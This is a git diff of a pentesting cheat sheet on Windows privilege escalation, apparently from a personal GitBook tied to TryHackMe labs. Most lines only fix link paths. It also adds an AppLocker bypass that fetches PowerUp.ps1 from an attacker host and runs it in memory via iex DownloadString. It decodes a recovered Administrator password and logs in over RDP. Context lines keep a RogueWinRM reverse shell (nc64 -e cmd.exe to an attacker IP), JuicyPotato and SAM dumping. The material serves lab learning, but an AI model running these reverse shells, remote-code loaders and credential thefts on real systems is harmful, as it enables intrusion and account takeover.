@@ -50,11 +50,11 @@ type C:\Windows\path\to\file\$FILE | findstr $STRING
 
 ### **Whoami /priv**
 
-| Finding                 | Comment                                                 | Examples                                                          |
-| ----------------------- | ------------------------------------------------------- | ----------------------------------------------------------------- |
-| SeImpersonatePrivilege  | Printspoofer - works on Windows 10 and Server 2016/2019 | [relevant.md](../../walkthroughs/tryhackme/relevant.md "mention") |
-|                         |                                                         |                                                                   |
-|                         |                                                         |                                                                   |
+| Finding                 | Comment                                                 | Examples                                                                |
+| ----------------------- | ------------------------------------------------------- | ----------------------------------------------------------------------- |
+| SeImpersonatePrivilege  | Printspoofer - works on Windows 10 and Server 2016/2019 | [relevant.md](../../../../walkthroughs/tryhackme/relevant.md "mention") |
+|                         |                                                         |                                                                         |
+|                         |                                                         |                                                                         |
 
 
 
@@ -62,13 +62,13 @@ type C:\Windows\path\to\file\$FILE | findstr $STRING
 
 Might be able to find interesting files by looking at what was recently accessed. Start -> run -> recent.
 
-<figure><img src="../../.gitbook/assets/image (3) (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (3) (5).png" alt=""><figcaption></figcaption></figure>
 
 ### **Powershell history**
 
 **Examples**
 
-[#harvesting-passwords-from-usual-spots](../../walkthroughs/tryhackme/windows-privilege-escalation.md#harvesting-passwords-from-usual-spots "mention")
+[#harvesting-passwords-from-usual-spots](../../../../walkthroughs/tryhackme/windows-privilege-escalation.md#harvesting-passwords-from-usual-spots "mention")
 
 **Victim(cmd)**
 
@@ -78,7 +78,7 @@ type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\Conso
 
 **Examples**
 
-[#harvesting-passwords-from-usual-spots](../../walkthroughs/tryhackme/windows-privilege-escalation.md#harvesting-passwords-from-usual-spots "mention")
+[#harvesting-passwords-from-usual-spots](../../../../walkthroughs/tryhackme/windows-privilege-escalation.md#harvesting-passwords-from-usual-spots "mention")
 
 Need GUI to see other command prompt that will be spawned
 
@@ -91,7 +91,7 @@ runas /savecred /user:$DOMAIN\$USERNAME cmd.exe
 
 **Examples**
 
-[#harvesting-passwords-from-usual-spots](../../walkthroughs/tryhackme/windows-privilege-escalation.md#harvesting-passwords-from-usual-spots "mention")
+[#harvesting-passwords-from-usual-spots](../../../../walkthroughs/tryhackme/windows-privilege-escalation.md#harvesting-passwords-from-usual-spots "mention")
 
 Retrieve the saved password stored in the saved PuTTY session under your profile.&#x20;
 
@@ -109,7 +109,7 @@ reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
 
 **Examples**
 
-[#tampering-with-unprivileged-accounts](../../walkthroughs/tryhackme/windows-local-persistence.md#tampering-with-unprivileged-accounts "mention")
+[#tampering-with-unprivileged-accounts](../../../../walkthroughs/tryhackme/windows-local-persistence.md#tampering-with-unprivileged-accounts "mention")
 
 **Kali(WinRM)**
 
@@ -124,7 +124,7 @@ download sam.bak
 
 **Examples**
 
-[#tampering-with-unprivileged-accounts](../../walkthroughs/tryhackme/windows-local-persistence.md#tampering-with-unprivileged-accounts "mention")
+[#tampering-with-unprivileged-accounts](../../../../walkthroughs/tryhackme/windows-local-persistence.md#tampering-with-unprivileged-accounts "mention")
 
 **Kali**
 
@@ -156,7 +156,7 @@ reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v
 
 **Examples**
 
-[#assign-group-memberships](../../walkthroughs/tryhackme/windows-local-persistence.md#assign-group-memberships "mention")
+[#assign-group-memberships](../../../../walkthroughs/tryhackme/windows-local-persistence.md#assign-group-memberships "mention")
 
 Add user to group that allows them to RDP
 
@@ -170,7 +170,7 @@ net localgroup "Remote Management Users" $USER /add
 
 **Examples**
 
-[windows-privilege-escalation.md](../../walkthroughs/tryhackme/windows-privilege-escalation.md "mention")[#abusing-scheduled-tasks](../../walkthroughs/tryhackme/windows-local-persistence.md#abusing-scheduled-tasks "mention")
+[windows-privilege-escalation.md](../../../../walkthroughs/tryhackme/windows-privilege-escalation.md "mention")[#abusing-scheduled-tasks](../../../../walkthroughs/tryhackme/windows-local-persistence.md#abusing-scheduled-tasks "mention")
 
 Looking into scheduled tasks on the target system, you may see a scheduled task that either lost its binary or it's using a binary you can modify.
 
@@ -188,7 +188,7 @@ schtasks
 schtasks /query /tn $TASK /fo list /v
 ```
 
-<figure><img src="../../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 **Victim(cmd)**
 
@@ -196,7 +196,7 @@ schtasks /query /tn $TASK /fo list /v
 icacls c:\tasks\schtask.bat
 ```
 
-<figure><img src="../../.gitbook/assets/image (20) (5) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (20) (5) (1).png" alt=""><figcaption></figcaption></figure>
 
 **Kali**
 
@@ -217,7 +217,7 @@ schtasks /run /tn $TASK
 
 **Examples**
 
-[#abusing-service-misconfigurations](../../walkthroughs/tryhackme/windows-privilege-escalation.md#abusing-service-misconfigurations "mention")
+[#abusing-service-misconfigurations](../../../../walkthroughs/tryhackme/windows-privilege-escalation.md#abusing-service-misconfigurations "mention")
 
 ### Insecure Permissions on Service Executable
 
@@ -229,7 +229,7 @@ schtasks /run /tn $TASK
 sc qc WindowsScheduler
 ```
 
-<figure><img src="../../.gitbook/assets/image (21) (5) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (21) (5) (1).png" alt=""><figcaption></figcaption></figure>
 
 **Victim(cmd)**
 
@@ -237,7 +237,7 @@ sc qc WindowsScheduler
 icacls C:\PROGRA~2\SYSTEM~1\WService.exe
 ```
 
-<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 **Kali**
 
@@ -289,13 +289,13 @@ sc.exe stop windowsscheduler
 sc.exe start windowsscheduler
 ```
 
-<figure><img src="../../.gitbook/assets/image (31) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (31) (2).png" alt=""><figcaption></figcaption></figure>
 
 ### Unquoted Service Paths
 
 **Examples**
 
-[#unquoted-service-paths](../../walkthroughs/tryhackme/windows-privilege-escalation.md#unquoted-service-paths "mention")
+[#unquoted-service-paths](../../../../walkthroughs/tryhackme/windows-privilege-escalation.md#unquoted-service-paths "mention")
 
 **Victim(cmd)**
 
@@ -303,7 +303,7 @@ sc.exe start windowsscheduler
  sc qc "disk sorter enterprise"
 ```
 
-<figure><img src="../../.gitbook/assets/image (12) (2) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (12) (2) (2).png" alt=""><figcaption></figcaption></figure>
 
 **Kali**
 
@@ -333,13 +333,13 @@ sc.exe stop "disk sorter enterprise"
 sc.exe start "disk sorter enterprise"
 ```
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (3) (1) (4).png" alt=""><figcaption></figcaption></figure>
 
 ### Insecure Service Permissions
 
 **Examples**
 
-[#insecure-service-permissions](../../walkthroughs/tryhackme/windows-privilege-escalation.md#insecure-service-permissions "mention")
+[#insecure-service-permissions](../../../../walkthroughs/tryhackme/windows-privilege-escalation.md#insecure-service-permissions "mention")
 
 **Victim(cmd)**
 
@@ -348,7 +348,7 @@ cd C:\tools\AccessChk
 accesschk64.exe -qlc thmservice
 ```
 
-<figure><img src="../../.gitbook/assets/image (7) (8) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (7) (8) (1).png" alt=""><figcaption></figcaption></figure>
 
 **Kali**
 
@@ -378,15 +378,15 @@ sc.exe stop THMService
 sc.exe start THMService
 ```
 
-<figure><img src="../../.gitbook/assets/image (16) (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (16) (3).png" alt=""><figcaption></figcaption></figure>
 
 ## Abusing dangerous privileges
 
 **Examples**
 
-[#abusing-dangerous-privileges](../../walkthroughs/tryhackme/windows-privilege-escalation.md#abusing-dangerous-privileges "mention")
+[#abusing-dangerous-privileges](../../../../walkthroughs/tryhackme/windows-privilege-escalation.md#abusing-dangerous-privileges "mention")
 
-<figure><img src="../../.gitbook/assets/image (32) (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (32) (3).png" alt=""><figcaption></figcaption></figure>
 
 **Kali**
 
@@ -400,9 +400,63 @@ nc -lvp 4442
 c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe 10.10.22.165 4442"
 ```
 
-<figure><img src="../../.gitbook/assets/image (2) (2) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (2) (2) (1).png" alt=""><figcaption></figcaption></figure>
 
-##
+## Bypassing UAC
+
+**Examples:**
+
+[bypassing-uac.md](../../../../walkthroughs/tryhackme/bypassing-uac.md "mention")
+
+## Bypassing Applocker
+
+**Examples:**
+
+[#bypassing-applocker](../../../../walkthroughs/tryhackme/corp.md#bypassing-applocker "mention")
+
+Load PowerUp.ps1 into memory.
+
+**Kali**
+
+```
+wget https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1
+python2 -m SimpleHTTPServer 81
+```
+
+Add the following line at the bottom to PowerUp.ps1 so it Invokes all checks automatically once downloaded
+
+**PowerUp.ps1**
+
+```
+Invoke-AllChecks
+```
+
+**Victim(powershell)**
+
+<pre><code>powershell -ep bypass
+<strong>iex​(New-Object Net.WebClient).DownloadString('http://$KALI:81/PowerUp.ps1') 
+</strong></code></pre>
+
+<figure><img src="../../../../.gitbook/assets/image (3) (3) (2).png" alt=""><figcaption></figcaption></figure>
+
+
+
+<figure><img src="../../../../.gitbook/assets/image (1) (1) (8).png" alt=""><figcaption></figcaption></figure>
+
+**Kali**
+
+```
+echo "dHFqSnBFWDlRdjh5YktJM3lIY2M9TCE1ZSghd1c7JFQ=" | base64 -d
+```
+
+<figure><img src="../../../../.gitbook/assets/image (11) (5).png" alt=""><figcaption></figcaption></figure>
+
+**Kali**
+
+```
+xfreerdp +clipboard /u:"Administrator" /v:$VICTIM:3389 /size:1024x568 /smart-sizing:800x1200
+Password: tqjJpEX9Qv8ybKI3yHcc=L!5e(!wW;$T
+```
 
 ## Privilege Escalation
 
@@ -439,7 +493,7 @@ JuicyPotato.exe -l 5050 -p C:\path\to\reverse-shell.exe -t *
 
 **Examples**
 
-[#privilege-escalation](../../walkthroughs/tryhackme/steel-mountain.md#privilege-escalation "mention")
+[#privilege-escalation](../../../../walkthroughs/tryhackme/steel-mountain.md#privilege-escalation "mention")
 
 **Setup**
 
@@ -466,7 +520,7 @@ Invoke-AllChecks
 
 **Examples**
 
-[hackpark.md](../../walkthroughs/tryhackme/hackpark.md "mention")
+[hackpark.md](../../../../walkthroughs/tryhackme/hackpark.md "mention")
 
 **Setup**
 
@@ -491,7 +545,7 @@ python3.9 windows-exploit-suggester2.py --database 2022-12-03-mssb.xls --systemi
 
 **Examples**
 
-[hackpark.md](../../walkthroughs/tryhackme/hackpark.md "mention")
+[hackpark.md](../../../../walkthroughs/tryhackme/hackpark.md "mention")
 
 **Setup**
 
@@ -516,11 +570,11 @@ winPEASx64.exe
 
 **Examples**
 
-[post-exploitation-basics.md](../../walkthroughs/tryhackme/post-exploitation-basics.md "mention")
+[post-exploitation-basics.md](../../../../walkthroughs/tryhackme/post-exploitation-basics.md "mention")
 
 Add this line to SharpHound.ps1 before transferring so I could run the command right away
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (4) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (3) (1) (4) (1).png" alt=""><figcaption></figcaption></figure>
 
 **Victim**
 
@@ -539,15 +593,15 @@ bloodhound --no-sandbox
 
 ### Find all Domain Admins
 
-<figure><img src="../../.gitbook/assets/image (15) (7) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (15) (7) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (84) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (84) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### List all Kerberostable accounts
 
-<figure><img src="../../.gitbook/assets/image (85) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (85) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (1) (1) (1) (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (1) (1) (1) (3).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -555,7 +609,7 @@ bloodhound --no-sandbox
 
 **Examples**
 
-[post-exploitation-basics.md](../../walkthroughs/tryhackme/post-exploitation-basics.md "mention")
+[post-exploitation-basics.md](../../../../walkthroughs/tryhackme/post-exploitation-basics.md "mention")
 
 **Victim**
 
